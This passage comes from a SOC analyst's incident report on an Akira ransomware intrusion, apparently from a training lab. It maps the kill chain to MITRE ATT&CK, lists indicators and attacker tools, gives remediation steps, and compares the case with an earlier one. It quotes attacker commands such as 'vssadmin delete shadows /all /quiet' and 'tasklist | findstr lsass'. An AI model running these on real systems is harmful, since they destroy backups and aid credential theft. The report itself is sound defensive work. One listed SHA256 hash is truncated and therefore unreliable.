Unlike The Broker where all three hosts (AS-PC1, AS-PC2, AS-SRV) were compromised, this time the attacker only hit two. AS-PC2 was their operational base where they re-entered via AnyDesk and ran the C2 beacon, and AS-SRV was the primary target for data exfiltration and ransomware encryption. AS-PC1 was not touched in this second intrusion.


---

## 🗺️ Full Kill Chain Summary (MITRE ATT&CK)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| Initial Access | T1219 Remote Access Software | AnyDesk re-entry from 88.97.164.155 via pre-staged backdoor |
| Execution | T1059.001 PowerShell | Invoke-WebRequest for tool downloads, wsync.exe deployment |
| Persistence | T1219 Remote Access Software | AnyDesk at C:\Users\Public\ with unattended access |
| Defense Evasion | T1562.001 Impair Defenses | kill.bat disabled Defender via registry |
| Defense Evasion | T1036.005 Masquerading | updater.exe disguised as legitimate process |
| Defense Evasion | T1070.004 File Deletion | clean.bat removed ransomware binary |
| Credential Access | T1057 Process Discovery | tasklist \| findstr lsass |
| Credential Access | T1003.001 LSASS Memory | Named pipe access, powershell read lsass memory |
| Discovery | T1046 Network Service Scanning | Advanced IP Scanner (scan.exe), subnet sweep |
| Lateral Movement | T1021 Remote Services | as.srv.administrator used to access AS-SRV |
| Collection | T1560 Archive Collected Data | st.exe created exfil_data.zip |
| Exfiltration | T1041 Exfiltration Over C2 | exfil_data.zip via C2 infrastructure |
| Command & Control | T1071 Application Layer Protocol | cdn.cloud-endpoint.net / sync.cloud-endpoint.net |
| Command & Control | T1105 Ingress Tool Transfer | bitsadmin.exe + Invoke-WebRequest |
| Impact | T1486 Data Encrypted for Impact | Akira ransomware (.akira extension) |
| Impact | T1490 Inhibit System Recovery | vssadmin delete shadows /all /quiet |

---

## 🛡️ Indicators of Compromise (IOCs)

### 🌐 Domains
| Domain | Purpose |
|--------|---------|
| cdn.cloud-endpoint.net | Ransomware Staging / C2 |
| sync.cloud-endpoint.net | Payload Hosting |
| relay-0b975d23.net.anydesk.com | AnyDesk Relay (Remote Access) |
| akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion | Akira TOR Negotiation Portal |

### 🔗 IP Addresses
| IP | Associated Domain / Purpose |
|----|-------------------|
| 104.21.30.237 | cloud-endpoint.net (Cloudflare) |
| 172.67.174.46 | cloud-endpoint.net (Cloudflare) |
| 88.97.164.155 | Attacker external IP (AnyDesk entry) |
| 10.1.0.183 | Internal, enumerated target |
| 10.1.0.154 | Internal, enumerated target |

### 📁 Files & Hashes
| Filename | SHA256 | Context |
|----------|--------|---------|
| wsync.exe (v1) | 66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b | C2 beacon, original (failed) |
| wsync.exe (v2) | 0072ca0d0adc9a1b2e1625db4409f57fc32b5a | C2 beacon, replacement (succeeded) |
| kill.bat | 0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c | Defense evasion, disabled Defender |
| scan.exe | 26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b | Advanced IP Scanner (SFX) |
| st.exe | 512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015 | Data staging / exfiltration tool |
| exfil_data.zip | 082fb434ee2a2663343ab2d3088435cd49ceaf8168521ed7e0613ddb4ac90ec0 | Exfiltration archive |
| updater.exe | e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b | Akira ransomware binary |
| clean.bat | — | Anti-forensics, deleted ransomware binary |
| AnyDesk.exe | f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532 | Legitimate tool abused for persistence (from The Broker) |

### 👤 Compromised Accounts
| Account | Role in Attack |
|---------|---------------|
| david.mitchell | Re-entry via AnyDesk, operational base on AS-PC2 |
| as.srv.administrator | Lateral movement to AS-SRV, ransomware deployment |

### 👤 Victim Identifiers
| Field | Value |
|-------|-------|
| Victim ID | 813R-QWJM-XKIJ |
| Encrypted Extension | .akira |
| Threat Actor | Akira |

### 🔧 Tools Used by Attacker
| Tool | Purpose |
|------|---------|
| AnyDesk | Re-entry via pre-staged backdoor (C:\Users\Public\) |
| wsync.exe | C2 beacon / attack orchestrator (C:\ProgramData\) |
| kill.bat | Disabled Windows Defender via registry |
| clean.bat | Deleted ransomware binary post-encryption |
| scan.exe / Advanced IP Scanner | Network reconnaissance |
| bitsadmin.exe | LOLBin for file downloads |
| Invoke-WebRequest | PowerShell fallback for file downloads |
| st.exe | Data staging / exfiltration |
| updater.exe | Akira ransomware binary |
| powershell.exe | Tool transfer, LSASS credential theft, ransomware staging |
| vssadmin.exe | Shadow copy deletion |

---

## 💡 Recommendations

1. **🔴 Immediate: Isolate AS-PC2 and AS-SRV** from the network to prevent further lateral movement or data exfiltration.
2. **🔴 Immediate: Reset all compromised account passwords** (david.mitchell, as.srv.administrator) and audit all domain admin accounts.
3. **🔴 Immediate: Block IOC domains** (cdn.cloud-endpoint.net, sync.cloud-endpoint.net) and attacker IP (88.97.164.155) at the firewall and DNS level.
4. **🔴 Immediate: Remove all AnyDesk installations** and block AnyDesk binaries and network traffic organisation-wide. The pre-staged backdoor from The Broker was the re-entry vector for this entire attack.
5. **🟠 Short-term: Audit all hosts** for wsync.exe, scan.exe, st.exe, kill.bat, clean.bat, and any files in C:\ProgramData\ and C:\Users\Public\ that were not present before the incident.
6. **🟠 Short-term: Enable tamper protection for Windows Defender** to prevent registry-based disabling of security controls.
7. **🟠 Short-term: Enable Volume Shadow Copy protection** and implement immutable backup solutions to prevent vssadmin-based recovery prevention.
8. **🟡 Medium-term: Implement application whitelisting** to prevent execution of unsigned binaries from user-writable directories.
9. **🟡 Medium-term: Deploy LAPS** (Local Administrator Password Solution) to prevent credential reuse across workstations.
10. **🟡 Medium-term: Block LOLBin abuse** by restricting bitsadmin.exe and certutil.exe execution via AppLocker or WDAC policies.
11. **🟢 Long-term: Implement network segmentation** to limit lateral movement between workstations and servers.
12. **🟢 Long-term: Deploy EDR with behavioural detection** tuned to detect named pipe access to LSASS, registry tampering of Defender settings, and SFX-based tool deployment.

---

## 🔗 Cross-Reference: The Broker vs The Buyer

| Element | The Broker | The Buyer |
|---------|-----------|-----------|
| Entry Vector | Malicious CV (Daniel_Richardson_CV.pdf.exe) | Pre-staged AnyDesk backdoor |
| C2 Domain | cdn.cloud-endpoint.net | cdn.cloud-endpoint.net (reused) |
| Payload Domain | sync.cloud-endpoint.net | sync.cloud-endpoint.net (reused) |
| C2 IPs | 104.21.30.237, 172.67.174.46 | 104.21.30.237, 172.67.174.46 (reused) |
| Download Tool | certutil.exe | bitsadmin.exe + Invoke-WebRequest |
| Remote Access | AnyDesk (deployed) | AnyDesk (reused from Broker) |
| Credential Theft | SAM/SYSTEM dump + SharpChrome | LSASS memory via named pipe |
| Lateral Movement | mstsc.exe (RDP) | as.srv.administrator account |
| Exfiltration | st.exe to exfil_data.zip | st.exe to exfil_data.zip (same tool) |
| Impact | Data staged for exfiltration | Akira ransomware + data exfiltration |
| Hosts Compromised | AS-PC1, AS-PC2, AS-SRV | AS-PC2, AS-SRV |

---

*Report prepared by Chukwuebuka Okorie, SOC Analyst L1, Log'n Pacific*
*Investigation conducted using Microsoft Defender for Endpoint and Microsoft Sentinel*
